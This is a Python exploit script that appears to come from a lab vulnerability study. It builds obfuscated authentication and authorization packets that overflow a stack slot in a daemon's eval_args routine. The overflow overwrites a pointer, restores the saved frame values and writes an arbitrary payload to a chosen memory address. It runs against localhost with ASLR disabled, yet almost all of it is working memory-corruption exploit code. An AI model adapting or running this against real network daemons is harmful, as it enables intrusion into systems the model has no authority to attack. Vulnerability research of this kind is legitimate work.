#!/usr/bin/env python3
"""W129: live-daemon write-what-where probe via eval_args' `t` stack slot.

On the plain -O0 build `t` lives at rbp-0x48 = cmdline+168, while `p` and
`argsizep` at cmdline+224/+216 are outside a copy that starts at +168.  Three
chosen `cmd=` records do the work:
  i=12: l=140 -> copy 136 chosen bytes, t: 32 -> 168
  i=13: l=12  -> copy 8 chosen bytes into t's slot, t <- (target-8)+8 = target
  i=14: l=5+N -> copy N chosen bytes plus a NUL to target
The transit copy also crosses the saved `cmdline` pointer (cmdline+136) and
loop counter `i` (cmdline+160); both are restored through the source bytes.
The target address is carried in the prime as wire data.  The lab daemon runs
under gdb, which disables ASLR, so the measured buffer address is stable; this
is a rung-4 mechanics probe, not a claimed attacker-side address leak.
No off-loopback traffic.
"""
import argparse
import hashlib
import socket
import struct


def pad(sid, key, version, seq, prev=b""):
    return hashlib.md5(sid + key + bytes([version, seq]) + prev).digest()


def obf(body, sid, key, version, seq):
    p = pad(sid, key, version, seq)
    out = bytearray()
    for i in range(0, len(body), 16):
        c = body[i:i + 16]
        out.extend(a ^ b for a, b in zip(c, p))
        p = pad(sid, key, version, seq, p)
    return bytes(out)


def wire_hdr(ptype, seq, sid, body, key, version=0xC0, flags=0):
    e = obf(body, sid, key, version, seq)
    hdr = struct.pack("!BBBBI", version, ptype, seq, flags, int.from_bytes(sid, "big"))
    hdr += struct.pack("!I", len(body))
    return hdr + e


def authen_start(sid, key, user, version=0xC0):
    u = user.encode()
    return wire_hdr(1, 1, sid, bytes([1, 0, 1, 1, len(u), 0, 0, 0]) + u, key, version)


def authen_cont_prime(sid, key, seq, body_len, pattern_body_off, pattern, version=0xC0):
    data_len = body_len - 5
    fixed = struct.pack("!HHB", 0, data_len, 0)
    data = bytearray(b"P" * data_len)
    off = pattern_body_off - 5
    data[off:off + len(pattern)] = pattern
    return wire_hdr(1, seq, sid, fixed + bytes(data), key, version)


def author_trigger(sid, key, seq, table, data, version=0xC0):
    fixed = bytes([6, 1, 1, 1, 0, 0, 0, len(table)])
    return wire_hdr(2, seq, sid, fixed + bytes(table) + data, key, version)


def main():
    ap = argparse.ArgumentParser()
    ap.add_argument("--port", type=int, default=4990)
    ap.add_argument("--key", default="demo")
    ap.add_argument("--trigger-sid", default="aabbccdd")
    ap.add_argument("--user", default="demo")
    ap.add_argument("--in-addr", default="0x5555555fdad0",
                    help="measured stable lab buffer address (gdb disables ASLR)")
    ap.add_argument("--target-off", type=int, default=1800)
    ap.add_argument("--write-payload", default="PWN3PWN3PWN3PWN3")
    ap.add_argument("--prime-len", type=int, default=2000)
    ap.add_argument("--pattern-off", type=int, default=1112)
    ap.add_argument("--no-prime", action="store_true")
    ap.add_argument("--data",
                    default="cmd=AAAAcmd=BBBBcmd=CCCCcmd=DDDDcmd=EEEEcmd=FFFFcmd=GGGGcmd=HHHH")
    ap.add_argument("--timeout", type=float, default=3.0)
    # Accepted and ignored: run_gdb2.py always passes these.
    ap.add_argument("--arg0", type=int, default=8)
    ap.add_argument("--rest", type=int, default=19)
    ap.add_argument("--rest-byte", type=int, default=8)
    a = ap.parse_args()

    sid = bytes.fromhex("11223344")
    key = a.key.encode()
    target = int(a.in_addr, 16) + a.target_off
    payload = a.write_payload.encode()

    # i=12 copies 136 bytes to cmdline+32..+167.  Two live frame slots are in
    # that range and must be restored through the source bytes:
    #   copied index 104 -> cmdline+136 = saved `cmdline` VLA pointer (rbp-0x68)
    #   copied index 128 -> cmdline+160 = loop counter `i` (rbp-0x50)
    # Setting i=12 means the loop's i++ lands on 13, the next record below.
    transit = bytearray(b"F" * 136)
    transit[104:112] = target.to_bytes(8, "little")
    transit[128:136] = (12).to_bytes(8, "little")

    pattern = bytearray()
    pattern += b"cmd=" + bytes(transit)                     # i=12: t 32 -> 168
    pattern += b"cmd=" + (target - 8).to_bytes(8, "little")  # i=13: overwrite t
    pattern += b"cmd=" + payload + b"\x00"                   # i=14: write to target
    pattern += b"X" * (400 - len(pattern))

    table = [8] * 20
    for si, val in ((8, 255), (9, 255), (10, 255), (11, 255),
                    (12, 140), (13, 12), (14, 5 + len(payload))):
        table[si] = val
    for si in range(15, 20):
        table[si] = 0

    s = socket.create_connection(("127.0.0.1", a.port), timeout=a.timeout)
    s.settimeout(a.timeout)

    if not a.no_prime:
        p1 = authen_start(sid, key, a.user)
        s.sendall(p1)
        try:
            r1 = s.recv(65536)
        except socket.timeout:
            r1 = b""
        print(f"seq1 sent={len(p1)} reply_len={len(r1)}")

        p2 = authen_cont_prime(sid, key, 3, a.prime_len, a.pattern_off, bytes(pattern))
        s.sendall(p2)
        try:
            r2 = s.recv(65536)
        except socket.timeout:
            r2 = b""
        print(f"seq3 sent={len(p2)} reply_len={len(r2)}")

    p3 = author_trigger(bytes.fromhex(a.trigger_sid), key, 1, table, a.data.encode())
    s.sendall(p3)
    try:
        r3 = s.recv(65536)
    except socket.timeout:
        r3 = b""
    print(f"trigger sent={len(p3)} reply_len={len(r3)} reply={r3[:64].hex()}")
    print(f"target=0x{target:x} payload={payload.hex()}")
    s.close()


if __name__ == "__main__":
    main()
